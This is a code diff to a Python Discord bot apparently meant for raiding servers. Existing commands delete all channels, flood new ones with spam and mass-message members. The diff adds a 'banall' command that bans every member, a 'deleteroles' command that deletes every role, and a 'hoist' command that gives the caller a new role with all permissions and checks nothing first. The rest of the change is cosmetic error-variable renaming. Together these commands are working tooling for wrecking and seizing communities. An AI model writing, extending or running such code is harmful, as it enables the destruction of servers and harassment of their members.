@@ -53,8 +53,8 @@ async def nuke(ctx, channelCount, messages, channelName, *, message):
             await channel.delete()
             print(f"Deleted channel {channel.name}")
 
-        except Exception as e:
-            print(f"Couldn't delete channel {channel.name}: {e}")
+        except Exception as error:
+            print(f"Couldn't delete channel {channel.name}: {error}")
 
     for i in range(int(channelCount)):
         try:
@@ -63,8 +63,8 @@ async def nuke(ctx, channelCount, messages, channelName, *, message):
 
             for j in range(int(messages)):
                 await channel.send(message)
-        except Exception as e:
-            print(f"Couldn't create text channel {channelName}: {e}")
+        except Exception as error:
+            print(f"Couldn't create text channel {channelName}: {error}")
 
 
 @bot.command()
@@ -78,13 +78,59 @@ async def dm(ctx, amount, *, message):
                 print(
                     f"Couldn't send a message to {member.display_name} ({member.id}). They may have DMs disabled or have blocked the bot."
                 )
-            except Exception as e:
+            except Exception as error:
                 print(
-                    f"An error occurred while sending a message to {member.display_name} ({member.id}): {e}"
+                    f"An error occurred while sending a message to {member.display_name} ({member.id}): {error}"
                 )
 
 
+@bot.command()
+@commands.has_permissions(ban_members=True)
+async def banall(ctx):
+    if ctx.guild.get_member(bot.user.id).guild_permissions.ban_members == False:
+        print("[ERROR] Bot does not have ban permissions")
+        return
+
+    for member in ctx.guild.members:
+        try:
+            await ctx.guild.ban(member)
+
+        except Exception as error:
+            print(f"Failed to ban {member}")
+
+
+@bot.command()
+async def deleteroles(ctx):
+    for role in ctx.guild.roles:
+        try:
+            await role.delete()
+            print("Role has been deleted")
+        except Exception as error:
+            print(f"Failed to delete role")
+
+
+@bot.command()
+async def hoist(ctx, name):
+    try:
+        role = await ctx.guild.create_role(
+            name=name, permissions=discord.Permissions.all()
+        )
+
+        await ctx.author.add_roles(role)
+
+        print("Role has been added")
+    except Exception as error:
+        print(f"Failed to give role: {error}")
+
+
 bot.remove_command("help")
+
+
+@bot.command()
+async def help(ctx):
+    command_list = [f".{command.name}" for command in bot.commands]
+    commands_text = "\n".join(command_list)
+    await ctx.send(f"Available commands:\n{commands_text}")
 
 
 bot.run(TOKEN)
